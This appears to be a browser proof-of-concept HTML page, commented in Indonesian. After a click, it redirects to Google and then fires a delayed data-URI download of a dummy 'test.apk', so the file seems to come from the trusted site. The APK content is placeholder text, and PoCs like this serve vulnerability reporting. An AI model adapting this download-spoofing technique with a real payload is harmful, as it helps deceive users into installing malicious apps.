<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Enhanced APK Download PoC</title>
</head>
<body>

<h3>Enhanced APK Download PoC</h3>
<button id="start">Start PoC</button>

<script>
document.getElementById('start').addEventListener('click', async () => {
  try {
    console.log("PoC started from origin:", location.origin);

    // 1. Redirect ke Google dulu
    window.location.href = "https://www.google.com";

    // 2. Tunggu beberapa detik sebelum trigger download
    setTimeout(() => {
      // 3. Konten dummy APK
      const content = `
PK
Fake_APK_File
AndroidManifest.xml
classes.dex
res/layout/activity_main.xml
END_OF_FILE
`;

      const encoded = encodeURIComponent(content);

      // 4. Buat element <a> untuk download
      const a = document.createElement('a');
      a.href = 'data:application/vnd.android.package-archive,' + encoded;
      a.download = 'test.apk';

      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      console.log("APK download triggered after redirect");

    }, 1500); // delay 1.5 detik agar halaman target muncul dulu

  } catch (e) {
    console.error("Error in PoC:", e);
  }
});
</script>

</body>
</html>
